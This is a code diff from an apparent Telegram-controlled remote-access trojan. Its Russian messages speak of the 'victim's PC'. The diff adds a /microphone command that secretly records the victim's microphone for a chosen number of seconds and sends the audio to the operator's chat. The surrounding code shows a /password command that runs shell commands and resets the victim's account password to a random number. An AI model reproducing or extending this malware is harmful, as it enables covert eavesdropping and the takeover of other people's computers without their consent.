@@ -481,6 +481,19 @@ def mecro(message):
     bot.send_message(message.chat.id, 'Сколько будет записываться звук с микро ', reply_markup=markup)
 
 
+@bot.message_handler(commands=['microphone'])
+def microphone(message):
+    try:
+        user_msg = '{0}'.format(message.text)
+        bot.send_message(message.chat.id, f'Запись с микро на {user_msg.split(' ')[1]} секунд')
+        micro_phone(int(user_msg.split(' ')[1]))
+        time.sleep(int(user_msg.split(' ')[1])+2)
+        bot.send_message(message.chat.id, "Вот на лови")
+        send_audio(bot, message.chat.id)
+    except:
+        bot.send_message(message.chat.id, 'Error')
+
+
 @bot.message_handler(commands=['password'])
 def password(message):
     bot.send_message(message.chat.id, "Если программа на жертве ПК не запущена от имени админестратора то не чего не получиться")
@@ -489,7 +502,6 @@ def password(message):
         subprocess.run(command, shell=True)
 
     try:
-        # Пример использования
         username = getpass.getuser()
         new_password = random.randint(12340985, 98479359)
         change_password(username, new_password)
